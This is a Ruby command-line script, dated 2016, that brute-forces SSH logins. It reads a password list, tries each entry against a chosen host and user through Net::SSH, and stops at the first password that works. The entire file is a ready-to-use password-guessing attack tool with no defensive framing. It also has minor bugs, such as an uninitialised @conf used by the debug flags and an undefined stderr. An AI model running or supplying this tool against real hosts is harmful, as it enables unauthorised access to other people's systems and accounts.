#!/usr/bin/ruby
# Author: René Kray <rene@kray.info>
# Date:   2016-09-26

require 'net/ssh'
require 'optparse'
require 'pp'
require 'colorize'

class BruteForce
    attr_accessor :conf, :debug, :host, :user, :passwordfile

    def initialize
        @passwordfile=ENV['HOME']+"/.ssh-brute-force.list"

    end

    def run
        raise "please set a user" if @user.nil?
        raise "please set a host" if @host.nil?
        raise "please set a password file" if @passwordfile.nil?

        file=File.open(@passwordfile)

        file.each do |pw|
            password=pw.strip
            printf "try %s@%s:%s",@user,@host,password
            if (check_host @host,@user,password)
                puts " -> "+"ok".green
                exit
            else
                puts " -> "+"false".red
            end
        end

        rescue RuntimeError => e
            puts e.message
    end

    def option_parser
        option_parser = OptionParser.new do |opts|
            opts.banner = "Usage: #{$0} [options]"
            opts.on( "-d", "--debug", "enable debug mode") do
                @conf[:debug] = true
                @debug = true
            end
            opts.on( "-v", "--verbose", "enable verbose logging") do
                @conf[:debug] = true
                @debug = true
            end
            opts.on( "-H", "--host host", "set hostname"
            ) do |option|
                @host=option
            end
            opts.on( "-u", "--user user", "set username"
            ) do |option|
                @user=option
            end
            opts.on( "-f", "--file file", "set password file"
            ) do |option|
                @passwordfile=option
            end
        end
        option_parser.parse!
    end

    private

    def check_host(host,user,pass)
        Net::SSH.start( host, user, :password => pass, :timeout => 1) do |ssh|
            ssh.exec!("hostname")
        end
        return true
        rescue => e
            stderr.puts e.message unless @debug.nil?
            return false
    end
end

# don't run this part neither load from another script nor irb
if $0 == __FILE__
    bf=BruteForce.new
    bf.option_parser
    bf.run
end


